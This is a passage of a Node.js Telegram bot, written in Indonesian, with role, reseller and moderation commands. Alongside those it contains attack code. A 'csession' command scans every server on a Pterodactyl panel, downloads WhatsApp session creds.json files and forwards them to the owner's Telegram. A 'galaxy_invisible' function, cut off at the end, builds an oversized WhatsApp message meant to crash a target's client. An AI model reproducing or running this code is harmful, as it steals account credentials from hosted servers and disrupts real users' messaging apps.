      const replyText = `*RES YOY*\n\n\`\`\`\n${json.result}\n\`\`\``;

      await ctx.reply(replyText, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error(err);
      ctx.reply('Terjadi kesalahan saat memproses permintaan.');
    }
  });
  
bot.hears(/^setversi\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  if (senderId !== BOT_OWNER_ID2) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!arg) return ctx.reply("❗ Gunakan:\nSetversi 6.0");

  const success = await updateBotVersion(arg);
  if (success) {
    ctx.reply(`✅ Versi bot berhasil diperbarui ke *${arg}*`, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal memperbarui versi bot.");
  }
});

 
bot.hears(/^countryinfo\b(?:\s+(.*))?$/i, async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`Countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });
  
bot.command("listcreds", (ctx) => {
  if (!isAdmin(ctx.from.id)) return ctx.reply("❌ Hanya admin yang bisa melihat credentials.");
  
  
  
    return ctx.reply("📭 Tidak ada credentials yang tersimpan.");
  
  
  let message = "🔐 *Daftar Credentials:*\n\n";
  credsData.credentials.forEach((cred, index) => {
    message += `*${index + 1}.* ${cred.name}\n`;
    message += `   👤 Oleh: ${cred.addedBy}\n`;
    message += `   📅 Tanggal: ${new Date(cred.addedAt).toLocaleDateString('id-ID')}\n\n`;
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});


bot.command("savecreds", (ctx) => {
  if (!isAdmin(ctx.from.id)) return ctx.reply("❌ Hanya admin yang bisa menyimpan credentials.");
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /savecreds <nama> <credentials_json>");
  
  const name = args[1];
  const credsJson = args.slice(2).join(" ");
  
  try {
    
    const parsedCreds = JSON.parse(credsJson);
    
    const credsData = getCreds();
    
    // Cek jika nama sudah ada
    if (credsData.credentials.some(c => c.name === name)) {
      return ctx.reply("❌ Nama credentials sudah ada. Gunakan nama yang berbeda.");
    }
    
    credsData.credentials.push({
      name,
      credentials: parsedCreds,
      addedBy: ctx.from.id,
      addedAt: new Date().toISOString()
    });
    
    saveCreds(credsData);
    ctx.reply(`✅ Credentials "${name}" berhasil disimpan.`);
  } catch (error) {
    ctx.reply("❌ Format JSON tidak valid. Pastikan credentials dalam format JSON yang benar.");
  }
});

bot.command("ceknum", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});

bot.command("addbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /addbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    if (!json.blacklist.includes(targetId)) {
      json.blacklist.push(targetId);
    }
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dimasukkan ke blacklist.` : "❌ Gagal menambahkan ke blacklist.");
});
bot.command("delbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /delbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    json.blacklist = json.blacklist.filter((id) => id !== targetId);
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dihapus dari blacklist.` : "❌ Gagal menghapus dari blacklist.");
});

bot.command("setwelcome", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== "8488114208") return ctx.reply("❌ Fitur ini hanya bisa digunakan oleh developer bot.");

  const arg = ctx.message.text.split(" ")[1];
  if (!arg || !["on", "off"].includes(arg)) {
    return ctx.reply("🛠️ Contoh penggunaan: /setwelcome on | off");
  }

  const config = loadWelcomeConfig();
  config.enabled = arg === "on";
  saveWelcomeConfig(config);

  ctx.reply(`✅ Welcome message telah di-${arg === "on" ? "aktifkan" : "nonaktifkan"}.`);
});

bot.command("ban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin diban.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil diban.");
  } catch {
    ctx.reply("❌ Gagal memban user.");
  }
});

bot.command("unban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unban.");

  try {
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil di-unban.");
  } catch {
    ctx.reply("❌ Gagal unban user.");
  }
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.photo?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});

bot.command("kick", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin dikick.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId); 
    ctx.reply("✅ User berhasil di-kick.");
  } catch {
    ctx.reply("❌ Gagal kick user.");
  }
});

bot.hears(/^iqc\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\nIqc <pesan> <baterai> <operator>\n\nContoh:\nIqc Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('Waiting For Proccesing...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command("mute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const [_, dur] = ctx.message.text.split(" ");
  if (!ctx.message.reply_to_message || !dur) return ctx.reply("❌ Contoh: Reply dan /mute 30s, 5m, 1h, atau 2d");

  const seconds = parseCooldownDuration(dur);
  if (!seconds) return ctx.reply("❌ Format durasi salah. Gunakan: 30s, 5m, 1h, atau 2d");

  const userId = ctx.message.reply_to_message.from.id;
  const untilDate = Math.floor(Date.now() / 1000) + seconds;

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: { can_send_messages: false },
      until_date: untilDate,
    });
    ctx.reply(`✅ User dimute selama ${dur}`);
  } catch {
    ctx.reply("❌ Gagal mute user.");
  }
});

bot.command("unmute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unmute.");

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    ctx.reply("✅ User berhasil di-unmute.");
  } catch {
    ctx.reply("❌ Gagal unmute user.");
  }
});

//=================================================\\
bot.hears(/^csession\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("›› Format: Csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("›› Format: Csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "Waiting For Proccesing...",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("addowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addowner <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  addOwner(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang owner selama ${duration}`);
});

bot.hears(/^accadmin\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: Accadmin <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId))
    return ctx.reply("❌ Hanya owner yang bisa menambah admin.");

  addAdmin(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang admin selama ${duration}`);
});

bot.hears(/^accprem\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: Accprem <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menambah premium.");

  addPremium(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang premium selama ${duration}`);
});

bot.hears(/^deldb\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: Deldb <id>");

  const targetId = args[1];

  if (ctx.from.id.toString() !== "7454464877") 
    return ctx.reply("Hanya owner utama.");

  removeOwner(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari owner`);
});

bot.hears(/^delprem\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: Delprem <id>");

  const targetId = args[1];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menghapus premium.");

  removePremium(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari premium`);
});

//=================================================\\
bot.hears(/^connect\b(?:\s+(.*))?$/i, checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply("❗ Contoh: Connect 628xxx");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Silahkan hapus session terlebih dahulu");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "RENZZEEE");

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
▢ Kode Pairing...
╰➤ Nomor  : ${phoneNumber} 
╰➤ Kode   : ${code}
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Information", url: "https://t.me/+cO_VvMlEbP1lMjll" },
            { text: "Channel", url: "https://t.me/renzzchannel1" }
          ]
        ]
      }
    });

  } catch (error) {
    console.error("Gagal melakukan pairing:", error);
    await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor Whatsapp valid!");
  }
});


//=================================================\\
// MOD management (developer only)
bot.hears(/^accmod\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    if (!json.mod.includes(id)) json.mod.push(id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} ditambahkan.` : "❌ Gagal menambah MOD.");
});

bot.hears(/^delmod\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    json.mod = json.mod.filter((m) => m !== id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} dihapus.` : "❌ Gagal menghapus MOD.");
});

// PT management (developer only)
bot.hears(/^accpt\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    if (!json.pt.includes(id)) json.pt.push(id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} ditambahkan.` : "❌ Gagal menambah PT.");
});

bot.hears(/^delpt\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    json.pt = json.pt.filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} dihapus.` : "❌ Gagal menghapus PT.");
});

bot.hears(/^accress\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accress 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    if (!json.resellers) json.resellers = [];
    if (!json.resellers.includes(id)) json.resellers.push(id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} ditambahkan.` : "❌ Gagal menambah reseller.");
});

bot.hears(/^delress\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delress 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    json.resellers = (json.resellers || []).filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} dihapus.` : "❌ Gagal menghapus reseller.");
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.hears(/^stiktok\b(?:\s+(.*))?$/i, async (ctx) => {
    // Ambil keyword dari teks perintah setelah /tiktok
    const keyword = ctx.message.text.split(' ').slice(1).join(' ');
    if (!keyword) {
      return ctx.reply('❌ Mohon masukkan kata kunci. Contoh: Stiktok sad');
    }

    try {
      // Request POST ke API TikTok
      const response = await axios.post('https://api.siputzx.my.id/api/s/tiktok', {
        query: keyword
      }, {
        headers: { 'Content-Type': 'application/json' }
      });

      const data = response.data;
      if (!data.status || !data.data || data.data.length === 0) {
        return ctx.reply('⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.');
      }

      // Ambil maksimal 3 video untuk balasan agar tidak terlalu panjang
      const videos = data.data.slice(0, 3);
      let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

      videos.forEach((video, i) => {
        replyText += `🎬 *${video.title.trim()}*\n`;
        replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
        replyText += `▶️ [Link Video](${video.play})\n`;
        replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
        replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
      });

      ctx.replyWithMarkdown(replyText);

    } catch (error) {
      console.error(error);
      ctx.reply('❌ Terjadi kesalahan saat mengambil data TikTok.');
    }
  });
  
bot.command("sticker", async (ctx) => {
  const rep = ctx.message.reply_to_message;
  if (!rep || !rep.sticker) return ctx.reply("❗ Reply ke sticker Telegram.");
  try { const link = await ctx.telegram.getFileLink(rep.sticker.file_id); ctx.reply(`🔗 URL Sticker: ${link}`); }
  catch { ctx.reply("❌ Gagal ambil URL sticker."); }
});
  
bot.hears(/^acctoken\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: Acctoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    if (!json.tokens.includes(token)) json.tokens.push(token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil ditambahkan." : "❌ Gagal menambahkan token.");
});

bot.hears(/^deltoken\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: Deltoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    json.tokens = json.tokens.filter((t) => t !== token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil dihapus." : "❌ Gagal menghapus token.");
});

bot.command("p", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  // pastikan reply pesan
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.from) return ctx.reply("❗ Harus reply ke pesan target.");

  // ambil argumen
  const args = ctx.message.text.split(" ").slice(1);
  const nominal = args[0];
  const gelar = args[1] ? args[1].toLowerCase() : null;

  if (!nominal || !gelar) {
    return ctx.reply("❗ Contoh: reply pesan lalu ketik\n/p 100000 reseller");
  }

  // validasi gelar
  const validRoles = ["reseller", "pt", "mod", "member"];
  if (!validRoles.includes(gelar)) {
    return ctx.reply("❌ Role tidak valid. Pilih salah satu: reseller, pt, mod, member");
  }

  const username = reply.from.username ? `@${reply.from.username}` : reply.from.id;
  const formatted = `${username} ${formatNominal(Number(nominal))} ${gelar.charAt(0).toUpperCase() + gelar.slice(1)}`;

  // simpan ke GitHub
  const success = await updateGitHubJSON(paymentPath, (json) => {
    if (!json.payments) json.payments = [];
    json.payments.push(formatted);
    return json;
  });

  ctx.reply(success ? `✅ Data tersimpan:\n${formatted}` : "❌ Gagal menyimpan data.");
});

bot.hears(/^listdb\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");
  
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${paymentPath}`;
    const { data } = await axios.get(url);
    const payments = data.payments || [];

    if (payments.length === 0) {
      return ctx.reply("📂 Belum ada data tersimpan.");
    }

    const listText = payments
      .map((p, i) => `${i + 1}. ${p}`)
      .join("\n");

    ctx.reply(`📜 Daftar Member Script:\n\n${listText}`);
  } catch (e) {
    console.error("Gagal ambil list:", e.message);
    ctx.reply("❌ Gagal mengambil data list.");
  }
});

//=================================================\\
async function galaxy_invisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Hama", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@rizxvelzinfinity${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
